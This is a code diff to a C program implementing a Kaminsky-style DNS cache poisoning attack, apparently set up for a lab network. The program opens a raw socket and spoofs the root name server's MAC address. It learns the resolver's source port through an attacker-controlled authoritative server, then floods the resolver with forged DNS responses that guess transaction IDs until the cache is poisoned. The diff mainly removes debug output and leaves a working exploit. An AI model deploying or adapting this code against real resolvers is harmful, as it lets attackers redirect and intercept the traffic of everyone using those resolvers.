@@ -66,18 +66,15 @@ static int setup_tcp_listener(void)
 
   sockfd = socket(AF_INET, SOCK_STREAM, 0);
   if (sockfd < 0) {
-    perror("socket (tcp listener)");
     return -1;
   }
   if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, (socklen_t)sizeof(opt)) < 0) {
-    perror("setsockopt(SO_REUSEADDR)");
     close(sockfd);
     return -1;
   }
 
   opt = 1;
     if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, (socklen_t)sizeof(opt)) < 0) {
-        perror("setsockopt(SO_REUSEPORT)");
         close(sockfd);
         return -1;
     }
@@ -89,18 +86,15 @@ static int setup_tcp_listener(void)
   addr.sin_port = htons(TCP_PORT);
 
   if (bind(sockfd, (struct sockaddr *)&addr, (socklen_t)sizeof(addr)) < 0) {
-    perror("bind (tcp listener)");
     close(sockfd);
     return -1;
   }
 
   if (listen(sockfd, 1) < 0) {
-    perror("listen");
     close(sockfd);
     return -1;
   }
 
-  printf("TCP listener ready on port %d\n", TCP_PORT);
   return sockfd;
 }
 
@@ -112,29 +106,23 @@ static int wait_for_resolver_port_over_tcp(int listen_sock)
   char buf[MAX_LEN_PORT];
   ssize_t n;
 
-  printf("waiting for resolver port from server over TCP...\n");
-
   conn = accept(listen_sock, (struct sockaddr *)&peer, &peer_len);
   if (conn < 0) {
-    perror("accept");
     return -1;
   }
 
   n = recv(conn, buf, (size_t)(sizeof(buf) - 1), 0);
   if (n < 0) {
-    perror("recv");
     close(conn);
     return -1;
   }
 
   buf[n] = '\0';
-  printf("received port: '%s'\n", buf);
 
   int port = atoi(buf);
   close(conn);
 
   if (port <= 0 || port > 65535) {
-    fprintf(stderr, "Invalid port number received: %d\n", port);
     return -1;
   }
 
@@ -245,7 +233,6 @@ static int get_interface_info(const char *ifname, unsigned char *mac, int *ifind
     int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     
     if (sockfd < 0) {
-        perror("socket for ioctl");
         return -1;
     }
     
@@ -254,7 +241,6 @@ static int get_interface_info(const char *ifname, unsigned char *mac, int *ifind
     
     // Get MAC address
     if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
-        perror("ioctl SIOCGIFHWADDR");
         close(sockfd);
         return -1;
     }
@@ -262,7 +248,6 @@ static int get_interface_info(const char *ifname, unsigned char *mac, int *ifind
     
     // Get interface index
     if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
-        perror("ioctl SIOCGIFINDEX");
         close(sockfd);
         return -1;
     }
@@ -280,29 +265,21 @@ static int init_raw_socket(void)
     // Create raw socket
     g_raw_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
     if (g_raw_sockfd < 0) {
-        perror("socket(AF_PACKET)");
         return -1;
     }
     
     // Get eth0 MAC address and interface index
     if (get_interface_info("eth0", g_src_mac, &ifindex) < 0) {
-        fprintf(stderr, "Failed to get eth0 interface info\n");
         close(g_raw_sockfd);
         g_raw_sockfd = -1;
         return -1;
     }
     
-    printf("eth0 MAC: %02x:%02x:%02x:%02x:%02x:%02x (ifindex=%d)\n",
-           g_src_mac[0], g_src_mac[1], g_src_mac[2],
-           g_src_mac[3], g_src_mac[4], g_src_mac[5], ifindex);
-    
     // Set source MAC to root NS (for spoofing packets from root server)
     memcpy(g_src_mac, ROOT_NS_MAC, 6);
-    printf("Spoofing as root NS MAC: 02:42:ac:11:00:04\n");
     
     // Set destination MAC to resolver
     memcpy(g_dest_mac, RESOLVER_MAC, 6);
-    printf("Sending to resolver MAC: 02:42:ac:11:00:03\n");
     
     // Setup sockaddr_ll for sendto
     memset(&g_dest_addr, 0, sizeof(g_dest_addr));
@@ -311,7 +288,6 @@ static int init_raw_socket(void)
     g_dest_addr.sll_halen = ETH_ALEN;
     memcpy(g_dest_addr.sll_addr, g_dest_mac, 6);
     
-    printf("Raw socket initialized on eth0\n");
     return 0;
 }
 
@@ -363,7 +339,6 @@ static int send_dns_query_to_resolver(const char *qname)
     // Create UDP socket
     sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     if (sockfd < 0) {
-        perror("socket (UDP)");
         return -1;
     }
     
@@ -376,7 +351,6 @@ static int send_dns_query_to_resolver(const char *qname)
     );
     
     if (!query) {
-        fprintf(stderr, "Failed to create DNS query for %s\n", qname);
         close(sockfd);
         return -1;
     }
@@ -384,8 +358,6 @@ static int send_dns_query_to_resolver(const char *qname)
     // Serialize to wire format
     status = ldns_pkt2wire(&wire_data, query, &wire_len);
     if (status != LDNS_STATUS_OK) {
-        fprintf(stderr, "Failed to serialize query: %s\n",
-                ldns_get_errorstr_by_id(status));
         ldns_pkt_free(query);
         close(sockfd);
         return -1;
@@ -396,7 +368,6 @@ static int send_dns_query_to_resolver(const char *qname)
     resolver_addr.sin_family = AF_INET;
     resolver_addr.sin_port = htons(DNS_PORT);
     if (inet_pton(AF_INET, RESOLVER_IP, &resolver_addr.sin_addr) != 1) {
-        perror("inet_pton");
         goto cleanup;
     }
     
@@ -406,11 +377,9 @@ static int send_dns_query_to_resolver(const char *qname)
                           sizeof(resolver_addr));
     
     if (sent < 0) {
-        perror("sendto (resolver)");
         goto cleanup;
     }
     
-    printf("Sent DNS query for %s to resolver %s\n", qname, RESOLVER_IP);
     ret = 0;
     
 cleanup:
@@ -438,36 +407,27 @@ static int learn_resolver_source_port(void)
     int listen_sock;
     int port;
     
-    printf("\n=== Learning Resolver Source Port ===\n");
-    
     // Setup TCP listener to receive port from our auth server
     listen_sock = setup_tcp_listener();
     if (listen_sock < 0) {
-        fprintf(stderr, "Failed to setup TCP listener\n");
         return -1;
     }
     
     // Send DNS query to resolver for our attacker domain
-    printf("Sending trigger query to resolver...\n");
     if (send_dns_query_to_resolver(trigger_domain) < 0) {
-        fprintf(stderr, "Failed to send DNS query\n");
         close(listen_sock);
         return -1;
     }
     
     // Wait for our auth server to send us the port over TCP
-    printf("Waiting for auth server to report resolver source port...\n");
     port = wait_for_resolver_port_over_tcp(listen_sock);
     close(listen_sock);
     
     if (port < 0 || port > 65535) {
-        fprintf(stderr, "Invalid port received: %d\n", port);
         return -1;
     }
     
     g_resolver_src_port = (uint16_t)port;
-    printf("\n✓ Resolver source port learned: %u\n", g_resolver_src_port);
-    printf("=====================================\n\n");
     
     return 0;
 }
@@ -503,7 +463,6 @@ static int build_spoofed_response(const char *qname,
     // Create new DNS packet
     response = ldns_pkt_new();
     if (!response) {
-        fprintf(stderr, "Failed to create DNS packet\n");
         return -1;
     }
     
@@ -519,7 +478,6 @@ static int build_spoofed_response(const char *qname,
     // Add question section (copy from original query)
     ldns_rdf *qname_rdf = ldns_dname_new_frm_str(qname);
     if (!qname_rdf) {
-        fprintf(stderr, "Failed to create domain name\n");
         goto cleanup;
     }
     
@@ -562,8 +520,6 @@ static int build_spoofed_response(const char *qname,
     // Serialize to wire format
     status = ldns_pkt2wire(out_buf, response, out_len);
     if (status != LDNS_STATUS_OK) {
-        fprintf(stderr, "Failed to serialize DNS packet: %s\n",
-                ldns_get_errorstr_by_id(status));
         goto cleanup;
     }
     
@@ -599,7 +555,6 @@ static int inject_spoofed_packet(const uint8_t *dns_data, size_t dns_len)
     total_len = eth_len + ip_len + udp_len + dns_len;
     
     if (total_len > MAX_BYTES_PER_PACKET) {
-        fprintf(stderr, "Packet too large: %zu bytes\n", total_len);
         return -1;
     }
     
@@ -645,7 +600,6 @@ static int inject_spoofed_packet(const uint8_t *dns_data, size_t dns_len)
                           (struct sockaddr *)&g_dest_addr, sizeof(g_dest_addr));
     
     if (sent < 0) {
-        perror("sendto");
         return -1;
     }
     
@@ -663,12 +617,9 @@ static void perform_attack_round(int round)
     build_unique_subdomain(round, subdomain, sizeof(subdomain));
 
     /* Step 1: send query to resolver */
-    printf("[Round %d] Querying resolver for: %s\n", round, subdomain);
     (void)send_dns_query_to_resolver(subdomain);
 
     /* Step 2: flood with spoofed answers trying different TXIDs */
-    printf("[Round %d] Flooding with up to %d spoofed responses...\n", 
-           round, MAX_SPOOFED_PKTS);
     
     uint8_t *spoofed_dns = NULL;
     size_t spoofed_len = 0;
@@ -695,15 +646,7 @@ static void perform_attack_round(int round)
             free(spoofed_dns);
             spoofed_dns = NULL;
         }
-        
-        // Optional: Print progress every 10000 packets
-        if ((i + 1) % 10000 == 0) {
-            printf("  Sent %u/%d packets...\n", i + 1, MAX_SPOOFED_PKTS);
-        }
     }
-    
-    printf("[Round %d] Injection complete: %d/%d packets sent successfully\n",
-           round, successful_injections, MAX_SPOOFED_PKTS);
 }
 
 /* Check if poisoning succeeded by querying
@@ -726,41 +669,28 @@ static int check_poisoning(void)
 
 int main(void)
 {
-    int ret = 1; /* default: failure */
+    int ret = EXIT_FAILURE;
 
-    /* Seed RNG - random subdomains or txid sequences. */
     (void)srand((unsigned int)time(NULL));
 
-    printf("=== Kaminsky DNS Cache Poisoning Attack ===\n\n");
-
-    printf("Step 1: Initialize raw socket for packet injection\n");
     if (init_raw_socket() != 0) {
-        return EXIT_FAILURE;
+        exit(EXIT_FAILURE);
     }
 
-    printf("Step 2: Learning resolver source port...\n");
     if (learn_resolver_source_port() != 0) {
         goto cleanup;
     }
 
-    printf("Step 3: Starting Kaminsky attack rounds...\n");
-    /* Main Kaminsky-style loop: multiple attack windows with different subdomains. */
     for (int round = 0; round < MAX_ROUNDS; ++round) {
         perform_attack_round(round);
 
         if (check_poisoning() != 0) {
-            /* success */
-            printf("\n✓ Attack successful! DNS cache poisoned.\n");
-            ret = 0;
+            ret = EXIT_SUCCESS;
             break;
         }
-    }
-    
-    if (ret != 0) {
-        printf("\n✗ Attack failed after %d rounds.\n", MAX_ROUNDS);
     }
 
 cleanup:
     cleanup_raw_socket();
-    return ret;
+    exit(ret);
 }
